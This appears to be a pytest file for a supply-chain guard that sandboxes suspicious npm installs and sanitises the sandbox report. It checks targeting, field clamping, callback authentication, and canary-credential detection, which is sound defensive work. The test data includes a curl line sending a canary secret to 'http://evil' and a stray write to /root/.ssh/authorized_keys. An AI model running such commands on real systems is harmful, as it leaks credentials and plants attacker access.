"""Cold-path detonation: the report is hostile input, and the hot path is sacred.

Two things are worth testing here and the sandbox itself is neither of them.
Running a container is Modal's job. What is ours: deciding *which* packages earn
a detonation, and refusing to let a report written inside a compromised
container dictate what lands in the audit trail.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app import config, detonation
from app.store import MemoryStore

# The worker lives outside the backend package — it is deployed to Modal, not
# imported by the gateway. Its report shaping is plain Python, so it is tested
# here rather than only in production.
sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "modal"))
import detonate as worker  # noqa: E402


# --- which installs earn a sandbox -------------------------------------------


@pytest.mark.parametrize(
    "decision,metadata,expected",
    [
        ("allow", {"verdict": {"severity": "clean"}}, False),
        ("flag", {"verdict": {"severity": "unknown"}}, True),
        ("block", {"verdict": {"severity": "malicious"}}, True),
        ("allow", {"unscanned": True}, True),
        ("allow", {"verdict": {"severity": "suspicious"}}, True),
    ],
)
def test_detonation_targets(monkeypatch, decision, metadata, expected) -> None:
    """A clean allow is the overwhelming majority of traffic and needs no
    evidence. Everything else — a thin flag, a block wanting proof, an override
    nobody examined — earns the sandbox."""
    monkeypatch.setattr(config, "DETONATION_ENABLED", True)
    monkeypatch.setattr(config, "MODAL_DETONATE_URL", "https://example.modal.run")
    assert detonation.should_detonate("package_install", decision, metadata) is expected


def test_detonation_is_off_without_configuration(monkeypatch) -> None:
    monkeypatch.setattr(config, "MODAL_DETONATE_URL", "")
    assert detonation.should_detonate("package_install", "block", {}) is False


def test_llm_calls_are_never_detonated(monkeypatch) -> None:
    monkeypatch.setattr(config, "DETONATION_ENABLED", True)
    monkeypatch.setattr(config, "MODAL_DETONATE_URL", "https://example.modal.run")
    assert detonation.should_detonate("llm_call", "block", {}) is False


# --- the report is hostile input ---------------------------------------------


def test_report_fields_are_clamped() -> None:
    """A package that wants to fill the incident table gets truncated."""
    clean = detonation.validate_report(
        {
            "status": "ok",
            "summary": "A" * 50_000,
            "unexpected_writes": [f"/tmp/{i}" for i in range(500)],
            "severity": "high",
        }
    )
    assert len(clean["summary"]) <= detonation.MAX_STRING
    assert len(clean["unexpected_writes"]) <= detonation.MAX_LIST_ITEMS


def test_unknown_fields_are_dropped() -> None:
    """Only the schema survives — no smuggling extra keys into the evidence."""
    clean = detonation.validate_report(
        {"status": "ok", "severity": "low", "evil": {"drop": "tables"}, "__proto__": "x"}
    )
    assert "evil" not in clean and "__proto__" not in clean


def test_severity_is_pinned_to_known_values() -> None:
    """severity drives how the dashboard renders, so it is not the package's
    to choose freely."""
    clean = detonation.validate_report({"status": "ok", "severity": "APOCALYPTIC"})
    assert clean["severity"] == "unknown"


def test_control_characters_are_stripped() -> None:
    """Terminal escapes are how you rewrite someone's log viewer."""
    clean = detonation.validate_report(
        {"status": "ok", "summary": "safe\x1b[31mred\x00null", "severity": "low"}
    )
    assert "\x1b" not in clean["summary"] and "\x00" not in clean["summary"]


def test_non_object_report_is_rejected() -> None:
    with pytest.raises(ValueError):
        detonation.validate_report(["not", "an", "object"])


# --- the callback endpoint ----------------------------------------------------


def test_callback_requires_the_bearer_token(
    client: TestClient, memory_store: MemoryStore, monkeypatch
) -> None:
    monkeypatch.setattr(config, "DETONATION_CALLBACK_TOKEN", "correct-token")
    for headers in ({}, {"Authorization": "Bearer wrong"}, {"Authorization": "correct-token"}):
        response = client.post(
            "/v1/detonations/some-action", json={"report": {}}, headers=headers
        )
        assert response.status_code == 401, headers


def test_callback_refused_when_no_token_is_configured(
    client: TestClient, memory_store: MemoryStore, monkeypatch
) -> None:
    """An unauthenticated callback endpoint would let anyone write evidence."""
    monkeypatch.setattr(config, "DETONATION_CALLBACK_TOKEN", "")
    response = client.post(
        "/v1/detonations/x", json={"report": {}}, headers={"Authorization": "Bearer anything"}
    )
    assert response.status_code == 401


def test_report_attaches_to_the_action(
    client: TestClient, memory_store: MemoryStore, monkeypatch, agent_headers
) -> None:
    monkeypatch.setattr(config, "DETONATION_CALLBACK_TOKEN", "correct-token")
    action_id = client.post(
        "/v1/guard/install",
        json={"package": "@ossprey/test-package"},
        headers=agent_headers,
    ).json()["action_id"]

    response = client.post(
        f"/v1/detonations/{action_id}",
        json={
            "report": {
                "status": "ok",
                "package": "@ossprey/test-package",
                "severity": "critical",
                "summary": "Install ran postinstall; exposed AWS_SECRET_ACCESS_KEY.",
                "canaries_exposed": ["AWS_SECRET_ACCESS_KEY"],
                "attempted_egress": True,
            }
        },
        headers={"Authorization": "Bearer correct-token"},
    )
    assert response.status_code == 200
    assert response.json()["severity"] == "critical"

    stored = memory_store.get_action(action_id)["metadata"]["detonation"]
    assert stored["canaries_exposed"] == ["AWS_SECRET_ACCESS_KEY"]
    # The incident a reviewer opens carries the measured evidence.
    incident = memory_store.incidents[0]
    assert incident["evidence"]["detonation"]["severity"] == "critical"


def test_unknown_action_is_not_created_by_a_callback(
    client: TestClient, memory_store: MemoryStore, monkeypatch
) -> None:
    monkeypatch.setattr(config, "DETONATION_CALLBACK_TOKEN", "correct-token")
    response = client.post(
        "/v1/detonations/1a2b3c4d-0000-0000-0000-000000000000",
        json={"report": {"status": "ok", "severity": "low"}},
        headers={"Authorization": "Bearer correct-token"},
    )
    assert response.status_code == 404


# --- the hot path is sacred ---------------------------------------------------


def test_unreachable_detonation_service_does_not_affect_the_decision(
    client: TestClient, memory_store: MemoryStore, monkeypatch, agent_headers
) -> None:
    """The guard's answer is already decided and sent. A detonation worker that
    is down, slow or misconfigured must be invisible to the agent."""
    monkeypatch.setattr(config, "DETONATION_ENABLED", True)
    monkeypatch.setattr(config, "MODAL_DETONATE_URL", "http://127.0.0.1:9")  # nothing listens
    monkeypatch.setattr(config, "PUBLIC_BASE_URL", "http://127.0.0.1:8000")

    # Clean first: the canary suspends the project, which would block whatever
    # came next for an entirely different and correct reason.
    clean = client.post("/v1/guard/install", json={"package": "react"}, headers=agent_headers)
    assert clean.status_code == 200
    assert clean.json()["decision"] == "allow"

    response = client.post(
        "/v1/guard/install",
        json={"package": "@ossprey/test-package"},
        headers=agent_headers,
    )
    assert response.status_code == 200
    assert response.json()["decision"] == "block"
    # The verdict is Ossprey's, not the detonation service's.
    assert response.json()["verdict"]["severity"] == "malicious"


def test_detonation_is_skipped_without_a_callback_address(monkeypatch, capsys) -> None:
    """No PUBLIC_BASE_URL means the worker has nowhere to send the report, so
    there is no point starting one."""
    monkeypatch.setattr(config, "MODAL_DETONATE_URL", "https://example.modal.run")
    monkeypatch.setattr(config, "PUBLIC_BASE_URL", "")
    detonation.request_detonation(
        action_id="a", project_id="p", package="left-pad", ecosystem="npm", version=None
    )
    assert "PUBLIC_BASE_URL is unset" in capsys.readouterr().out


# --- worker report shaping ----------------------------------------------------


def test_install_argv_keeps_lifecycle_scripts_enabled() -> None:
    """Disabling scripts would make the sandbox pointless — they are the thing
    being observed."""
    argv = worker.install_argv("npm", "left-pad", "1.3.0")
    assert "--ignore-scripts" not in argv
    assert "left-pad@1.3.0" in argv


def test_severity_ladder_is_conservative() -> None:
    """A postinstall alone is ordinary — native modules build that way."""
    assert worker.severity_of({"ran_lifecycle_scripts": ["postinstall"]}) == "low"
    assert worker.severity_of(
        {"ran_lifecycle_scripts": ["postinstall"], "attempted_egress": True}
    ) == "high"
    assert worker.severity_of({"canaries_exposed": ["OPENAI_API_KEY"]}) == "critical"
    assert worker.severity_of({}) == "none"


def test_expected_install_paths_are_not_reported_as_stray_writes() -> None:
    stray = worker.unexpected_paths(
        ["/work/node_modules/left-pad/index.js", "/root/.ssh/authorized_keys", "/tmp/build.log"]
    )
    assert stray == ["/root/.ssh/authorized_keys"]


def test_canary_detection_finds_a_staged_credential() -> None:
    canaries = worker.build_canaries()
    leaked = canaries["AWS_SECRET_ACCESS_KEY"]
    assert worker.canaries_found(f"curl -d {leaked} http://evil", canaries) == [
        "AWS_SECRET_ACCESS_KEY"
    ]
    assert worker.canaries_found("nothing interesting here", canaries) == []


def test_canaries_are_unique_per_run_and_obviously_synthetic() -> None:
    """A fixed value can collide with unrelated text and read as a leak; a fresh
    one makes a match unambiguous. And nothing here may look like a real key —
    GitHub push protection rejected exactly that, correctly."""
    first, second = worker.build_canaries(), worker.build_canaries()
    assert first != second
    for value in first.values():
        assert value.startswith(worker.CANARY_PREFIX)
    # A canary from one run must not register as exposed in another.
    assert worker.canaries_found(first["OPENAI_API_KEY"], second) == []


def test_error_reports_still_shape_cleanly() -> None:
    report = worker.shape_report(
        package="x", ecosystem="npm", version=None, exit_code=None, output="",
        written_paths=[], package_json=None, duration_ms=12, error="sandbox timed out",
    )
    assert report["status"] == "error"
    assert "sandbox timed out" in report["error"]
